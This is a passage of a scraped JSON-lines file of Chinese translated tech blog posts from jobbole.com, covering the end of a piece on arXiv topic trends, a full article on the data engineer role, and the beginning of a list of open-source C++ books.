19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n0.0462375339982 fractal\r\n0.112222705524 learning bayesian\r\n0.123531424661 ibp\r\n0.138351983723 texture analysis\r\n0.152810895084 bayesian network\r\n0.170535340862 differential evolution\r\n0.227932960894 wavelet transform\r\n0.24482875551 dirichlet process</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd582d025c033293843-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d025c033293843-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d025c033293843-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d025c033293843-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d025c033293843-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d025c033293843-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d025c033293843-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d025c033293843-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd582d025c033293843-1\"><span class=\"crayon-cn\">0.0462375339982</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">fractal</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d025c033293843-2\"><span class=\"crayon-cn\">0.112222705524</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">learning </span><span class=\"crayon-i\">bayesian</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d025c033293843-3\"><span class=\"crayon-cn\">0.123531424661</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ibp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d025c033293843-4\"><span class=\"crayon-cn\">0.138351983723</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">texture </span><span class=\"crayon-i\">analysis</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d025c033293843-5\"><span class=\"crayon-cn\">0.152810895084</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bayesian </span><span class=\"crayon-i\">network</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d025c033293843-6\"><span class=\"crayon-cn\">0.170535340862</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">differential </span><span class=\"crayon-i\">evolution</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d025c033293843-7\"><span class=\"crayon-cn\">0.227932960894</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">wavelet </span><span class=\"crayon-i\">transform</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d025c033293843-8\"><span class=\"crayon-cn\">0.24482875551</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">dirichlet </span><span class=\"crayon-v\">process</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<p id=\"5615\" class=\"graf graf--p graf-after--pre\">我不确定 “fractal” 指什么，但是一般来说看起来像是贝叶斯非参数受到攻击。</p>\n<h2 id=\"f4ff\" class=\"graf graf--h3 graf-after--p\">结论</h2>\n<p id=\"2a07\" class=\"graf graf--p graf-after--h3\">现在提交的论文主题应该是围绕全卷积编码器解码器  BatchNorm  ResNet  GAN（ Fully Convolutional Encoder Decoder BatchNorm ResNet GAN ）应用于风格转换，用 Adam 进行优化。这听起来似乎没那么不着边际。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/dd708b5011ca615a666a617f958683e8.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/7bd3dbe2e00ad5c5d39167e2fbbc6464.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110976\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110976votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110976\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/4b984c976f6d01d29b5371c01b42b6a1.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Python，数据挖掘        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/paradise_FD\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/paradise_fd/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/ff247977ac3e5237654ad324e8c880ed.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/04/24", "praise_nums": 2}
{"tags": " 2 评论 ,数据工程师,IT技术", "front_image_path": "full/8ec59a708427b99dc7d3761950e0b6443c5ce1eb.jpg", "title": "数据工程师的崛起", "url_object_id": "1fd2cf2674be133277839d2d77e8640e", "url": "http://blog.jobbole.com/110985/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/marax\">马然</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.freecodecamp.com/the-rise-of-the-data-engineer-91be18f1e603#.uc56h2fyt\">Maxime Beauchemin</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>本文作者以自己在 Airbnb、Facebook、Yahoo 做数据工程师的经验告诉大家：数据工程师的主要职责；当代数据工程的范畴；以及要做数据工程师都需要哪些技能。</p>\n<p><b></b>2011年，我作为一名商业智能工程师加入 Facebook。到了 2013 年离开的时候，我的职称是数据工程师。</p>\n<p>获得这个职称，并不是因为我被升职或是分配。而是 Facebook 觉得我们的工作已经超越了典型的商业智能。我们为自己创造的这个新角色是个全新的学科。</p>\n<p>我的团队处在这场变革的前线。我们一直在开发新的技能呢、新的处理方式、新的工具，而且通常与传统方式背道而驰。</p>\n<p>我们是先头部队！我们是数据工程师！</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff05xul7psj20rs0ijdx1.jpg\" width=\"690\" height=\"460\"></p>\n<h3>数据工程是什么？</h3>\n<p>数据科学作为一个学科，已度过其自我肯定和自我定义的青春期。而处在同期的数据工程，是个年龄稍小的弟弟，但是也在度过相似的阶段。数据工程学科以其兄长为榜样，但也在相反的领域定义自己，并找寻属于自已的身份。</p>\n<p>数据工程师也像数据科学家一样要写代码。数据科学家有很好的分析能力，并且对数据可视化很感兴趣。与数据科学家不同，而且受启发于我们更显成熟的父学科——软件工程，数据工程师要构建工具、基础设施、框架和服务。事实上可以证明，相比数据科学，数据工程更接近软件工程。</p>\n<p>如果讨论与既有职责的关系，数据工程领域可以认为是<strong>商业智能</strong>和<strong>数据仓库</strong>的超集，而且更多的元素是从<strong>软件工程</strong>得来的。这个学科也囊括了所谓的“大数据”分布式系统的相关领域内容，以及广泛的Hadoop生态圈、流式处理和大规模计算的相关概念。</p>\n<p>在还没有正规化的<strong>数据基础架构</strong>团队的小公司里，数据工程的职责也会涵盖搭建和维护组织数据基础架构的工作任务。这包括搭建和维护像 Hadoop/Hive/HBase、Spark 平台之类的活。</p>\n<p>在小一些的环境里，人们倾向使用 Amazon 或 Databricks之类的托管服务，或者从 Cloudera 或 Hortonworks 之类的厂商获取支持，这本质上就是将数据工程的职责外包给了其他公司。</p>\n<p>在大一些的环境里，由于对数据基础架构团队的需求越来越高时，组织更倾向于专门指定或者开设一个正式的角色来处理这些工作。在这些组织中，这个把数据工程流程自动化的职责，同时落到了数据工程团队和数据基础架构团队手中，而且两个团队合作解决高级问题也是很常见的。</p>\n<p>虽然这个角色在工程方面的范围在扩大，但其他原本作为商业工程角色的应关注的方面，却变得越来越次要。比如像构建和维护大量的报表和仪表板，已不是一个数据工程师的主要关注领域。</p>\n<p>我们现在有了更好的自服务工具，可以让分析师、数据科学家和广义的“信息工作者”变得更精通数据，可以独自应付数据的使用。</p>\n<h3>ETL 在变化</h3>\n<p>我们也观察到从拖拽式 ETL (Extract Transform and Load) 工具到一种更加可编程化的方式的大体转变。像 Informatica、IBM Datastage、Cognos、AbInitio 和 Microsoft SSIS 之类的平台技术掌握在现在的数据工程师中并不常见，取而代之的是更通用的软件工程技能，和对编程或配置驱动的平台技术的掌握，像 Airflow、Oozie、Azkabhan 或 Luigi。工程师开发和维护自己的任务编排器/调度器也是很常见的。</p>\n<p>有很多不使用拖拽工具开发复杂软件的理由：但最重要的是<strong>代码</strong>才是对软件最好的抽象。讨论这个话题超出了本文的范围，但是也很容易推导出为什么要用代码写 ETL，原因和写其他软件是一样的。代码允许任意程度的抽象，允许使用熟悉的方法进行所有逻辑处理，可以很好地和源控制集成，也易于版本管理和协作。事实上 ETL 工具暴露图形接口给用户像是数据处理发展史上的一个迂回，这个话题都可再单独写成一篇有意思的博客了。</p>\n<p>让我们强调下这个事实，传统 ETL 工具所暴露出的这种抽象是达不到目的的。我们当然需要将数据处理、计算以及存储进行抽象，但我觉得解决的方法并不是将 ETL 元语（比如源/目标、聚合、过滤条件）展现为一种拖拽风格，需要的是一种更高级的抽象。</p>\n<p>举例说明，在现代数据环境中做抽象， A/B 测试框架的试验设置：整个试验是什么样的？相关的处理操作是什么？应该暴露给多少比例的用户？预期每个试验会影响哪些度量？试验什么时候生效？在这个例子中，我们有一个需要接收精确、高级输入，需要进行复杂统计学运算以及得出计算结果的框架。我们期望如果引入一个新的试验，就可以相应进行额外的运算并得到额外的结果。在这个例子中，我们要注意的重点是，在这个抽象中输入变量并不是由传统 ETL 工具给出的，而且在拖拽界面中构建这样一个抽象也毫无操作性可言。</p>\n<p>对于现代数据工程师而言，传统的 ETL 工具大多数都已<strong>过时</strong>了，因为无法用代码表达逻辑。因此所需要的抽象也就不能用这些工具直观表达。现在大家知道了数据工程师的职责包括了设计大量的 ETL，并且知道了一套全新工具和方法论是必需的，可以说这迫使这个学科从头重建。数据工程师需要新的技术栈、新的工具、一套新的约束，并且很多时候，是新的一代人。</p>\n<h3>数据建模在改变</h3>\n<p>典型的数据建模技术（比如星型模型），曾经定义了我们典型地通过数据仓库为分析工作进行数据建模的方法，但现在已不像之前那样重要。传统的数据仓库最佳实践已经改变。存储和计算要比以前便宜，而且随着可线性扩展的分布式数据库的出现，工程时间成了更紧缺的资源。</p>\n<p>这里列举一些数据建模技术方面的变化：</p>\n<ul>\n<li>进一步反范式化：在维度中维护代理键这件事可能很棘手，而且这使得事实表的可读性变差。而在事实表中使用自然的让人可读的键和维度属性变得越来越普遍，省去了在分布式数据库中大量繁重的 join 操作。同时要注意像 Parquet 或者 ORC 之类的序列化格式，或者 Vertica 之类的数据库引擎，都提供了编码和压缩的支持，这可以减少通常由于使用反范式化所带来的性能损失。那些系统本身具备为存储进行范式化的能力。</li>\n<li><strong>blobs</strong>（二进制大对象）：现代数据库已经逐渐通过本地类型和方法支持 blobs。这让数据建模师学会了新的招式，并且可以让事实表根据需要一次存储多个粒度的数据。</li>\n<li>动态模式：由于 MapReduce 的出现，以及文档存储越来越流行，和 blobs 在数据库中的支持，不需要执行 <a href=\"https://en.wikipedia.org/wiki/Data_definition_language\">DML</a>（数据操作语言）就改进数据库模式变得更容易。这使得以迭代方式去建数据仓库更加容易，也免得开发前需要达成完全一致和认同。</li>\n<li>系统化维度快照（在每个 ETL 调度周期为维度存储一个全量副本，通常存储在独立的表分区）作为一种处理<a href=\"https://en.wikipedia.org/wiki/Slowly_changing_dimension\">缓慢变化维</a>（SCD, slowly changing dimension）的通用方法，只要很少的工作量，是一种简单通用的方式。而且这种方式不像经典方式，在写 ETL 或者类似的查询时可以很容易掌握。将维度属性反范式化到事实表，在事务发生时就直接记录维度属性值，，也是一种容易并且相对廉价的方式。回想一下，复杂的 SCD 建模技术其实是不直观的，而且降低了可访问性。</li>\n<li><strong>一致性</strong>：一致性维度和度量在现在的数据环境中，依然是极为重要的。但是随着数据仓库需求的快速变化，随着更多的团队和角色被邀请到这项工作中贡献力量，一致性就少了一分必要性，更多的是一种权衡。当分歧的痛点变得无法控制，其背后也会产生一致和趋同。</li>\n</ul>\n<p> </p>\n<h2>角色和任务</h2>\n<h3>数据仓库</h3>\n<blockquote><p>“数据仓库是一个专门为查询和分析而构造的事务数据副本。” — Ralph Kimball</p>\n<p>数据仓库是一个面向主题的、集成的、时变的、非易失的集合，用来支持管理层的决策制定过程。 — Bill Inmon</p></blockquote>\n<p>数据仓库依然像之前一样重要，数据工程师负责了很多方面的数据仓库建设和运维的工作。数据工程师的焦点就是数据仓库和相关工作。</p>\n<p>现代数据仓库应该是比之前更加开放的设施，欢迎数据科学家、分析师和软件工程师去参与到建设和维护中。如果企业活动限制了什么角色才能够管理数据流程，那数据显然就过于中心化了。虽然这允许随着组织的数据需求而相应扩展，但是经常导致形成了更混乱的、走形的、不完善的基础设施。</p>\n<p>数据工程团队通常会拥有数据仓库中几片有保证的、高质量的区域。比如在 Airbnb，有一组“核心”模式（schema）由数据工程团队管理，这里有清晰定义和度量的服务等级协议（SLA，service level agreement），严格遵守命名约定，并且相关的流水线代码遵循一套最佳实践。</p>\n<p>为数据对象制定标准、最佳实践和认证流程的“卓越中心”，这也成为数据工程团队的职责之一。团队可以进而去参与或领导一个项目来分享其核心能力，以帮助其他团队成为更佳的数据仓库公民。比如，Facebook 有一个“数据夏令营”的培训项目，Airbnb 正在开发一个类似的“数据大学”的项目，数据工程师在这里主持会议来教大家如何熟练使用数据。</p>\n<p>数据工程师也是数据仓库的“图书管理员”，编目和组织元数据，定义从仓库归档或提取数据的流程。在一个快速生长、迅速演变、轻度混乱的数据环境，元数据管理和元数据工具成为一个现代数据平台的关键组件。</p>\n<h3>性能调整和优化</h3>\n<p>随着数据变得比以前更加具有战略意义，企业为他们的数据基础设施建设所提高的预算确实令人印象深刻。这样，数据工程师把时间花在数据处理和存储的性能调整和优化上也就更加合理。由于在方面的预算极少缩减，优化往往从在相同的资源下完成更多事情的角度出发，或者是从试图使资源利用和开销的指数级增长线性化的角度。</p>\n<p>知道了数据工程栈发展的复杂性正在暴增，我们可以设想优化这个栈和流程的复杂度也同样充满挑战。可能很容易通过很小的努力获得巨大成功的地方，收益递减法则通常是适用的。</p>\n<p>建设可以随企业规模增长的基础设施（或在其上建设），并时刻保持资源意识，无疑是对数据工程师有好处的。</p>\n<h3>数据集成</h3>\n<p>数据集成，是通过数据交换来集成业务和系统其背后的实际操作，它和以前同样重要，也和以前同样充满挑战。由于<a href=\"https://en.wikipedia.org/wiki/Software_as_a_service\">软件即服务</a>（SaaS, Software as a Service）逐渐成为企业运营的新标准方式，跨越这些系统来同步相关数据就成为更加关键的需求了。不仅SaaS服务本身需要最新的数据来运行，我们通常也想把产生在SaaS侧的数据拿到数据仓库，来和我们其他数据一起进行分析。当然SaaS经常会提供它们自己的分析，但是没有系统地支持企业中其余数据所能提供的视角，通常得把这些数据拉取回来。</p>\n<p>不集成和共享通用的主键，就让 SaaS 服务重新定义参考数据，这简直是场灾难，应该极力避免。谁也不想人为地在两个不同的系统中维护两份雇员和顾客列表。最糟糕的是，必须要在把他们的 HR 数据拉回仓库时做模糊匹配。</p>\n<p>最坏的情况，企业高管经常会在不实际考虑数据集成难度的情况下和 SaaS 提供商签约。提供商特意计划好淡化这些集成任务，以促进他们的销售，然后让数据工程师受困于去做充满疑问的、不被重视的工作。更不用说事实上典型的 SaaS API 经常设计不合理、文档不清晰，并且是“敏捷”的：就是说你可以认为它们会在不做通知的情况下改版。</p>\n<h3>服务</h3>\n<p>数据工程师工作在一种更高层级的抽象中，就是说在某些场景下要提供服务和工具来使数据工程师、数据科学家或者分析师要手动来完成的工作自动化。</p>\n<p>这里列举数据工程师和数据基础架构工程师可能构建和维护的一小部分服务。</p>\n<ul>\n<li>数据摄取：围绕“爬取”数据库、载入日志、从外部存储和API获取数据的服务和工具</li>\n<li>指标计算：计算和汇总相关参与指标、增长指标或细分指标量的框架</li>\n<li>异常检测：使数据处理自动化，以便当异常事件发生或趋势明显变化时警示相关人员</li>\n<li>元数据管理：可以生成和消费元数据，并方便在数据仓库中查找信息的相关工具。</li>\n<li>实验：A/B测试和实验框架通常是一个重要的企业分析，并带有一个关键的数据工程模块。</li>\n<li>检测仪：从日志时间和相关属性到那些事件，数据工程师</li>\n<li>会话：为帮助分析师理解用户行为，为理解时间行为序列专门设计的流水线。</li>\n</ul>\n<p>就像软件工程师一样，数据工程师必须不断关注工作自动化、构建抽象来使他们能应对重重困难。虽然环境不同，可自动化的工作的性质不同，但自动化的需求在各个环境是普遍存在的。</p>\n<h3>技能要求</h3>\n<p><strong>精通</strong><strong>SQL</strong>：如果说英语是商业语言，那 SQL 就是数据语言。如果英语都说不好的话，作为一个商务人士又能做的怎么样呢？虽然一代又一代技术老去和退出舞台，但是 SQL 一直作为数据的通用语言顽强地活着。数据工程师应该能够使用 SQL 表达各种复杂逻辑，比如使用“关联子查询”和窗口函数。SQL/DML/DDL 原语已经足够简单，对于数据工程师来说应该完全掌握了。除了SQL的声明特性，数据工程师还应该有能力理解数据库的执行计划，并明白每个步骤是什么，明白索引是如何工作的，明白不同的 join 算法，以及执行计划的分布维度（distributed dimension）。</p>\n<p><strong>数据建模技术</strong>：对于数据工程师来说，应该对实体/关系模型形成一种认知反射（cognitive reflex），并且对范式化有清晰的认识，同时对权衡反范式化有敏锐的直觉。数据工程师应该熟悉<a href=\"https://en.wikipedia.org/wiki/Dimensional_modeling\">维度建模</a>和相关概念和用语。</p>\n<p>ETL 设计：编写高效、可扩展的、“可演化”的 ETL 才是关键。我正计划在接下来的博文中具体讨论这个主题。</p>\n<p><strong>架构规划</strong>：就像任何专业领域的专家，数据工程师需要对大多数工具、平台、库和其他可以运用的资源有一个较高层级的理解。比如不同种类的数据库、计算引擎、流处理器、消息队列、工作流编排器、序列化格式和其他相关技术背后的属性、用例和微妙之处。设计解决方案时，数据工程师必须能够对使用哪种技术做出好的选择，能够想象到如何使它们协同工作。</p>\n<h3>总而言之</h3>\n<p>通过过去 5 年在硅谷 Airbnb、Facebook、Yahoo! 的工作，以及和像 Google、Netflix、Amazon、Uber、Lyft 等几十个各种体量的公司的各种类型的数据团队的丰富交流，我发现大家对于“数据工程师”的发展成什么样，看法越来越趋于一致，而且我觉得有必要分享一些我的发现。</p>\n<p>我希望这篇文章可作为某种意义上的数据工程宣言，并且我希望可以在从事相关领域的社区中激起回应。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110985\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110985votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110985\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/marax\">马然</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/marax\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/02/56b7c1f1ce13899a3d36cc17c198ce70.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Data drives everything.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/marax\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/marax/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/marax/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1ff05xul7psj20rs0ijdx1.jpg"], "fav_nums": 7, "comment_nums": 2, "create_date": "2017/04/26", "praise_nums": 2}
{"tags": "书籍与教程,书籍, 2 评论 ", "front_image_path": "full/9f90fcb037f5bd7aaf49f042fab0f98b0b0bd0d2.jpg", "title": "通过这 9 本开源书，学好 C++", "url_object_id": "549053b4770cc826e0b7aefb7b900c88", "url": "http://blog.jobbole.com/110975/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/nemoland\">李大萌</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.ossblog.org/master-c-programming-with-open-source-books/\">Steve Emms</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>书籍非常具有个人主观性，编程类的书籍也不例外。但是不管书籍的风格，重点或者节奏如何，好的 C++ 编程书能带读者开启一段引人入胜的旅程，拓展 C++ 语言的能力，向读者展示如何使用C++来构建各种东西。</p>\n<p>我精心挑选了一些 C++ 的书籍，这些书都非常值得一读。我推荐的这 9 本书都是根据公共版权许可发行的书籍。在此之前，我先简要介绍一下 C++。</p>\n<p>C++ 是由Bjarne Stroustrup设计的，在1983年发布了第一个版本。它是一门静态类型，通用的，可移植编程语言，形式自由，多范式，需要编译。也因为它结合了高层次和低层次的语言特征，被认为是一种中级语言。C++ 专为系统和应用程序编程而设计，它对 C 语言进行了扩展，自增操作符记为++，因此叫 C++。</p>\n<p>C++ 一直是一门备受欢迎编程语言。例如，它被大量地用于嵌入式系统、银行和电信领域。它是 C 语言的超集，保留了 C 语言的效率和便利的符号标记，同时提供更强大的类型检查，多继承，数据抽象，异常处理，运算符重载，泛型编程和面向对象编程的功能。C++ 对许多其他语言产生了影响，包括 C#、Java 以及 C 语言的发展。</p>\n<h2><a href=\"https://theboostcpplibraries.com/\" target=\"_blank\">《Boost C++ 类库》（The Boost C++ Libraries）</a></h2>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fey28dlkabj205k06tmx8.jpg\"></p>\n<p style=\"text-align: center;\">作者 Boris Schäling，570 页</p>\n<p>Boost C++库在C++世界中有非常重要的影响力。这些便携式的库为诸多任务和结构提供了支持，包括多线程，容器，字符串和文本处理，迭代器，线性代数，伪随机数生成，元程序设计模板，并发程序设计，数据结构，图像处理，正则表达式和单元测试等。 Boost几乎可以用于任何现代操作系统，包括Linux和Windows的衍生版本，同时也支持大多数现代编译器。</p>\n<p>本书介绍了72个非常实用的Boost库，这些库涵盖的范围非常广，可以帮助程序员更容易地管理内存和处理字符串。这些库还提供了扩展标准库的多种容器和其他数据结构，使用这些库可以轻松地构建独立于平台的网络应用程序。</p>\n<p>本书是值得添加到各类收藏的好东西。书里的430个代码示例很好地阐明了这些库的功能。</p>\n<p>书中章节对内存管理，字符串处理，容器，数据结构，算法，通信，流和文件以及时间等问题进行了研究。稍后的章节继续探讨了函数，并行性和泛型编程问题。在结尾覆盖了大量有关语言扩展，错误信息以及数字处理，应用程序库，设计模式和其他库等内容。</p>\n<p>Boost C++库是根据Creative Commons Attribution – NonCommercial – NoDerivatives 4.0国际许可证发布的。如果您喜欢随身携带书籍，可以在Amazon上购买纸质版。电子版也可以在kindle上购买，电子书和 PDF 格式都可以。</p>\n<h2><a href=\"http://www.icce.rug.nl/documents/cplusplus/\" target=\"_blank\">《C++注解》（C++ Annotations）</a></h2>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fey28cyvlmj20d20ift8y.jpg\" width=\"228\" height=\"322\"></p>\n<p style=\"text-align: center;\">作者 Frank B. Brokken，1029 页</p>\n<p>本书提供了有关C++编程语言的全方位教程，可以用作C ++编程课程的教科书。它适用于熟悉C语言或者类似C语言语法的用户。</p>\n<p>包括以下章节：</p>\n<ul>\n<li>命名空间</li>\n<li>字符串——C语言提供了基本的字符串支持</li>\n<li>I/O字节流——提供了基于类概念的输入/输出（I / O）库</li>\n<li>类——C针对不同类型数据结构提供了两种方法。 